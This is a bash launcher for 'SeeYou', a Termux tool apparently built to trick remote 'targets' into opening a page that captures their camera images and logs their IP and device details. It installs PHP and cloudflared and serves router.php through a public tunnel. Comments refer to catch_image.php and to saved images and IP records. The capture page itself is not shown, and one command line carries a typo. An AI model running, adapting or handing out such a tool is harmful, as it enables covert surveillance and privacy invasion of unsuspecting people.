#!/bin/bash

# --- Color Codes (For professional logging in Termux) ---
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# --- Function to display a clean header ---
tool_header() {
    clear
    echo -e "${RED}======================================================${NC}"
    echo -e "${CYAN}    📸 SeeYou: Professional Camera Monitoring Tool ${NC}"
    echo -e "${CYAN}    ------------------------------------------- ${NC}"
    echo -e "${YELLOW}    Developer: Ch Kashif ${NC}"
    echo -e "${RED}======================================================${NC}"
}

# --- Function to check and install dependencies (PHP & Cloudflared) ---
check_dependencies() {
    tool_header
    echo-e "\n${YELLOW}[i] Checking and installing necessary dependencies...${NC}"
    
    if ! command -v php &> /dev/null; then
        echo -e "${RED}[!] PHP is not installed. Installing now...${NC}"
        pkg install php -y > /dev/null 2>&1
    fi
    
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${RED}[!] Cloudflared is not installed. Installing now...${NC}"
        pkg install cloudflared -y > /dev/null 2>&1
    fi

    if [ ! -d "images" ]; then
        mkdir images
    fi
    if [ ! -f "ip_logs.txt" ]; then
        touch ip_logs.txt
    fi

    echo -e "${GREEN}[✓] All dependencies are ready. Termux is prepared!${NC}"
}

# --- Function to ask the user for server mode choice ---
tool_menu() {
    tool_header
    echo -e "\n${CYAN}Choose your running mode:${NC}\n"
    echo -e "${GREEN}[1] Public Link (Cloudflared Tunnel - For External Targets)${NC}"
    echo -e "${YELLOW}[2] Local Host (127.0.0.1:8080 - For Testing/Local Network)${NC}"
    echo -e "\n${RED}[3] Exit${NC}\n"
    
    echo -e -n "${CYAN}[?] Enter your choice (1 or 2): ${NC}"
    read choice
    
    sleep 1

    case $choice in
        1)
            run_public
            ;;
        2)
            run_local
            ;;
        3)
            echo -e "\n${YELLOW}[i] Exiting SeeYou Tool. Goodbye!${NC}\n"
            killall php 2>/dev/null
            exit 0
            ;;
        *)
            echo -e "\n${RED}[!] Invalid choice. Please enter 1, 2, or 3.${NC}"
            sleep 2
            tool_menu 
            ;;
    esac
}

# --- Function to run server on Public Link via Cloudflared ---
run_public() {
    tool_header
    echo -e "\n${CYAN}[--- PUBLIC MODE SELECTED ---]${NC}"
    
    # 1. Start PHP Server in the background (Logs suppressed for clean public view)
    echo -e "\n${YELLOW}[i] Starting PHP Server on 127.0.0.1:8080 (Logs Suppressed)...${NC}"
    php -S 127.0.0.1:8080 router.php > /dev/null 2>&1 & 
    PHP_PID=$!
    
    sleep 2
    
    # 2. Display IP Log Block Location
    echo -e "${RED}======================================================${NC}"
    echo -e "${CYAN}  [IP RECORD] All IP & Device Records are saved in:${NC}"
    echo -e "${GREEN}  ~/SeeYou/ip_logs.txt${NC}"
    echo -e "${RED}======================================================${NC}"

    # 3. Start Cloudflared Tunneling
    echo -e "${YELLOW}[i] Generating the Cloudflared public tunnel link...${NC}"
    echo -e "${YELLOW}[+] Monitoring will begin once the public URL appears...${NC}"
    
    cloudflared tunnel --url 127.0.0.1:8080
    
    # 4. Clean up
    echo -e "\n${RED}[!] Tool stopped. Terminating PHP server...${NC}"
    kill $PHP_PID 2>/dev/null
}

# --- Function to run server on Local Host (No Tunneling) ---
run_local() {
    tool_header
    echo -e "\n${CYAN}[--- LOCAL HOST MODE SELECTED ---]${NC}"
    
    # Display IP Log Block Location
    echo -e "${RED}======================================================${NC}"
    echo -e "${CYAN}  [IP RECORD] All IP & Device Records are saved in:${NC}"
    echo -e "${GREEN}  ~/SeeYou/ip_logs.txt${NC}"
    echo -e "${RED}======================================================${NC}"

    echo -e "\n${GREEN}[✓] Access Link (Local Network Only):${NC}"
    echo -e "${GREEN}    http://127.0.0.1:8080${NC}"
    
    # Starting PHP Server in foreground (Restored to original, noisy state)
    echo -e "\n${YELLOW}[i] Starting PHP Server on 127.0.0.1:8080 (Server Logs ON)...${NC}"
    echo -e "${YELLOW}[👀] Real-time monitoring started. Press Ctrl+C to stop.${NC}\n"
    
    # FIX: Reverting to the old command to show server logs (e.g., "Accepted," "Closing," "POST /catch_image.php")
    php -S 127.0.0.1:8080 router.php
}

# --- Main execution flow ---
check_dependencies
tool_menu
